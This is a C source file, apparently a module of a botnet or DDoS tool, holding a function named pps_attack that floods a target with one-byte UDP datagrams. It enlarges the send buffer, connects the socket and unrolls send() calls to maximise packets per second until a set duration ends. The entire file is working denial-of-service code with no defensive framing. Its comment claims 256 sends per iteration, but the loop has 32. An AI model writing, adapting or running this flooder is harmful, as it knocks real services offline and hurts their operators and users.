#define _GNU_SOURCE
#include "headers/attack_params.h"

/* PPS flood — maximum packets per second, minimum packet size.
   Uses plain send() in a tight loop — compatible with all cross-compilers.
   1-byte payload = smallest UDP datagram, zero rand/sleep overhead.      */

#define PPS_BURST 256   /* unrolled sends per loop iteration */

void* pps_attack(void* arg) {
    attack_params* params = (attack_params*)arg;
    if (!params) return NULL;

    int fd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (fd < 0) return NULL;

    /* Large send buffer so kernel never stalls */
    int sndbuf = 16 * 1024 * 1024;
    setsockopt(fd, SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf));

    /* connect() — turns sendto into send(), faster kernel path */
    if (connect(fd, (struct sockaddr*)&params->target_addr,
                sizeof(params->target_addr)) < 0) {
        close(fd);
        return NULL;
    }

    /* 1-byte payload — smallest possible UDP datagram */
    static const unsigned char pkt[1] = {0xAB};

    time_t end_time = time(NULL) + params->duration;
    uint64_t iter   = 0;

    while (params->active) {
        /* check time every 8192 iterations to avoid syscall overhead */
        if ((iter & 8191) == 0 && time(NULL) >= end_time) break;

        /* 256 sends per iteration — manual unroll keeps hot loop tight */
        send(fd, pkt, 1, MSG_NOSIGNAL | MSG_DONTWAIT);
        send(fd, pkt, 1, MSG_NOSIGNAL | MSG_DONTWAIT);
        send(fd, pkt, 1, MSG_NOSIGNAL | MSG_DONTWAIT);
        send(fd, pkt, 1, MSG_NOSIGNAL | MSG_DONTWAIT);
        send(fd, pkt, 1, MSG_NOSIGNAL | MSG_DONTWAIT);
        send(fd, pkt, 1, MSG_NOSIGNAL | MSG_DONTWAIT);
        send(fd, pkt, 1, MSG_NOSIGNAL | MSG_DONTWAIT);
        send(fd, pkt, 1, MSG_NOSIGNAL | MSG_DONTWAIT);
        send(fd, pkt, 1, MSG_NOSIGNAL | MSG_DONTWAIT);
        send(fd, pkt, 1, MSG_NOSIGNAL | MSG_DONTWAIT);
        send(fd, pkt, 1, MSG_NOSIGNAL | MSG_DONTWAIT);
        send(fd, pkt, 1, MSG_NOSIGNAL | MSG_DONTWAIT);
        send(fd, pkt, 1, MSG_NOSIGNAL | MSG_DONTWAIT);
        send(fd, pkt, 1, MSG_NOSIGNAL | MSG_DONTWAIT);
        send(fd, pkt, 1, MSG_NOSIGNAL | MSG_DONTWAIT);
        send(fd, pkt, 1, MSG_NOSIGNAL | MSG_DONTWAIT);
        send(fd, pkt, 1, MSG_NOSIGNAL | MSG_DONTWAIT);
        send(fd, pkt, 1, MSG_NOSIGNAL | MSG_DONTWAIT);
        send(fd, pkt, 1, MSG_NOSIGNAL | MSG_DONTWAIT);
        send(fd, pkt, 1, MSG_NOSIGNAL | MSG_DONTWAIT);
        send(fd, pkt, 1, MSG_NOSIGNAL | MSG_DONTWAIT);
        send(fd, pkt, 1, MSG_NOSIGNAL | MSG_DONTWAIT);
        send(fd, pkt, 1, MSG_NOSIGNAL | MSG_DONTWAIT);
        send(fd, pkt, 1, MSG_NOSIGNAL | MSG_DONTWAIT);
        send(fd, pkt, 1, MSG_NOSIGNAL | MSG_DONTWAIT);
        send(fd, pkt, 1, MSG_NOSIGNAL | MSG_DONTWAIT);
        send(fd, pkt, 1, MSG_NOSIGNAL | MSG_DONTWAIT);
        send(fd, pkt, 1, MSG_NOSIGNAL | MSG_DONTWAIT);
        send(fd, pkt, 1, MSG_NOSIGNAL | MSG_DONTWAIT);
        send(fd, pkt, 1, MSG_NOSIGNAL | MSG_DONTWAIT);
        send(fd, pkt, 1, MSG_NOSIGNAL | MSG_DONTWAIT);
        send(fd, pkt, 1, MSG_NOSIGNAL | MSG_DONTWAIT);
        iter++;
    }

    close(fd);
    return NULL;
}
